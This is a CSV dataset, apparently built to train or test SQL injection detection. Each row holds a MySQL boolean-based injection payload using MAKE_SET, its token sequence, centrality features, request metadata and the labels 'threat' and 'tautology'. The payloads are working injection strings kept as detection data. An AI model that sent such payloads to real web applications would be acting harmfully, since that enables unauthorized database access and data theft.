payload,token,centrality,reqmethod,length,uagent,class,label
"rob.star@gmail.com"" AND MAKE_SET(2621=2163,2163) AND ""WzPn""=""WzPn",STR DOT STAR ATR STR DOT STR DQUT AND STR INT EQ INT CMMA INT AND DQUT STR DQUT EQ DQUT STR,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,GET,65,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com"") AND MAKE_SET(9977=1060,1060) AND (""Zpac"" LIKE ""Zpac",STR DOT STAR ATR STR DOT STR DQUT RPRN AND STR INT EQ INT CMMA INT AND LPRN DQUT STR DQUT LIKE DQUT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,GET,72,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com"") AND MAKE_SET(5180=5180,7930) AND (""ejzn"" LIKE ""ejzn",STR DOT STAR ATR STR DOT STR DQUT RPRN AND STR INT EQ INT CMMA INT AND LPRN DQUT STR DQUT LIKE DQUT STR,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,GET,72,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com"" AND MAKE_SET(5180=5180,7930) AND ""tfJj"" LIKE ""tfJj",STR DOT STAR ATR STR DOT STR DQUT AND STR INT EQ INT CMMA INT AND DQUT STR DQUT LIKE DQUT STR,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,GET,70,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com%') AND MAKE_SET(5180=5180,7930) AND ('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN AND STR INT EQ INT CMMA INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.17391304347826086 0.21739130434782608 0.2608695652173913 0.30434782608695654 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.34782608695652173 0.30434782608695654 0.2608695652173913 0.21739130434782608 0.17391304347826086,GET,61,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com%')) AND MAKE_SET(4326=6146,6146) AND (('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN RPRN AND STR INT EQ INT CMMA INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,GET,63,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com%')) AND MAKE_SET(5180=5180,7930) AND (('%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT RPRN RPRN AND STR INT EQ INT CMMA INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,GET,63,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com%' AND MAKE_SET(5458=2713,2713) AND '%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT AND STR INT EQ INT CMMA INT AND SQUT PRCNT SQUT EQ SQUT,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,GET,59,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com%' AND MAKE_SET(5180=5180,7930) AND '%'='",STR DOT STAR ATR STR DOT STR PRCNT SQUT AND STR INT EQ INT CMMA INT AND SQUT PRCNT SQUT EQ SQUT,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,GET,59,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com%"" AND MAKE_SET(5180=5180,7930) AND ""%""=""",STR DOT STAR ATR STR DOT STR PRCNT DQUT AND STR INT EQ INT CMMA INT AND DQUT PRCNT DQUT EQ DQUT,0.19047619047619047 0.23809523809523808 0.2857142857142857 0.3333333333333333 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.38095238095238093 0.3333333333333333 0.2857142857142857 0.23809523809523808 0.19047619047619047,GET,59,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com AND MAKE_SET(5146=3657,3657)-- nGRz",STR DOT STAR ATR STR DOT STR AND STR INT EQ INT CMMA INT DSCMT STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,GET,54,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"rob.star@gmail.com AND MAKE_SET(2964=3601,3601)# yqCN",STR DOT STAR ATR STR DOT STR AND STR INT EQ INT CMMA INT HASH STR,0.26666666666666666 0.3333333333333333 0.4 0.4666666666666667 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.5333333333333333 0.4666666666666667 0.4 0.3333333333333333 0.26666666666666666,GET,53,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-1237) OR MAKE_SET(1118=9383,9383)-- OqMk",MINUS INT RPRN OR STR INT EQ INT CMMA INT DSCMT STR,0.36363636363636365 0.4545454545454546 0.5454545454545454 0.6363636363636364 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.7272727272727273 0.6363636363636364 0.5454545454545454 0.4545454545454546 0.36363636363636365,GET,41,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-7949) OR MAKE_SET(3389=2883,2883) AND (5043=5043",MINUS INT RPRN OR STR INT EQ INT CMMA INT AND LPRN INT EQ INT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,GET,49,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-4116) OR MAKE_SET(6467=6467,9248) AND (2879=2879",MINUS INT RPRN OR STR INT EQ INT CMMA INT AND LPRN INT EQ INT,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,GET,49,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-1596)) OR MAKE_SET(3282=3513,3513) AND ((4345=4345",MINUS INT RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN INT EQ INT,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,51,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-6556))) OR MAKE_SET(1565=3638,3638) AND (((7174=7174",MINUS INT RPRN RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN LPRN INT EQ INT,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,53,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-8083 OR MAKE_SET(9106=2361,2361)",MINUS INT OR STR INT EQ INT CMMA INT,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,33,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-9062 OR MAKE_SET(6467=6467,9248)",MINUS INT OR STR INT EQ INT CMMA INT,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,33,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-1454')) OR MAKE_SET(6467=6467,9248) AND (('HsYH'='HsYH",MINUS INT SQUT RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,55,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-7246'))) OR MAKE_SET(2026=1631,1631) AND ((('xKzJ'='xKzJ",MINUS INT SQUT RPRN RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,57,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-2889'))) OR MAKE_SET(6467=6467,9248) AND ((('IjLY'='IjLY",MINUS INT SQUT RPRN RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,57,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-6369' OR MAKE_SET(1863=6265,6265) AND 'rnxH'='rnxH",MINUS INT SQUT OR STR INT EQ INT CMMA INT AND SQUT STR SQUT EQ SQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,51,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-3302' OR MAKE_SET(6467=6467,9248) AND 'ZBak'='ZBak",MINUS INT SQUT OR STR INT EQ INT CMMA INT AND SQUT STR SQUT EQ SQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,51,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-3555') OR MAKE_SET(5128=3224,3224) AND ('psBM' LIKE 'psBM",MINUS INT SQUT RPRN OR STR INT EQ INT CMMA INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,58,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-5371') OR MAKE_SET(6467=6467,9248) AND ('EsiM' LIKE 'EsiM",MINUS INT SQUT RPRN OR STR INT EQ INT CMMA INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,58,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-1684')) OR MAKE_SET(6467=6467,9248) AND (('vtBe' LIKE 'vtBe",MINUS INT SQUT RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,60,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-4243"") OR MAKE_SET(9488=8093,8093) AND (""SoOx""=""SoOx",MINUS INT DQUT RPRN OR STR INT EQ INT CMMA INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,53,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-7710"")) OR MAKE_SET(9309=8174,8174) AND ((""zjAq""=""zjAq",MINUS INT DQUT RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,55,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-3664"" OR MAKE_SET(7478=8234,8234) AND ""rHry""=""rHry",MINUS INT DQUT OR STR INT EQ INT CMMA INT AND DQUT STR DQUT EQ DQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,51,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-5864"") OR MAKE_SET(6765=3687,3687) AND (""QmDG"" LIKE ""QmDG",MINUS INT DQUT RPRN OR STR INT EQ INT CMMA INT AND LPRN DQUT STR DQUT LIKE DQUT STR,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,58,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-1556"" OR MAKE_SET(8343=6652,6652) AND ""SRWH"" LIKE ""SRWH",MINUS INT DQUT OR STR INT EQ INT CMMA INT AND DQUT STR DQUT LIKE DQUT STR,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,56,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-3411%') OR MAKE_SET(1553=1563,1563) AND ('%'='",MINUS INT PRCNT SQUT RPRN OR STR INT EQ INT CMMA INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,47,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-1872%')) OR MAKE_SET(1096=1592,1592) AND (('%'='",MINUS INT PRCNT SQUT RPRN RPRN OR STR INT EQ INT CMMA INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,49,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-9913%' OR MAKE_SET(6581=1274,1274) AND '%'='",MINUS INT PRCNT SQUT OR STR INT EQ INT CMMA INT AND SQUT PRCNT SQUT EQ SQUT,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,45,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-9352%' OR MAKE_SET(6467=6467,9248) AND '%'='",MINUS INT PRCNT SQUT OR STR INT EQ INT CMMA INT AND SQUT PRCNT SQUT EQ SQUT,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,45,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
"-7186%"" OR MAKE_SET(6893=1714,1714) AND ""%""=""",MINUS INT PRCNT DQUT OR STR INT EQ INT CMMA INT AND DQUT PRCNT DQUT EQ DQUT,0.25 0.3125 0.375 0.4375 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.5 0.4375 0.375 0.3125 0.25,GET,45,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,tautology
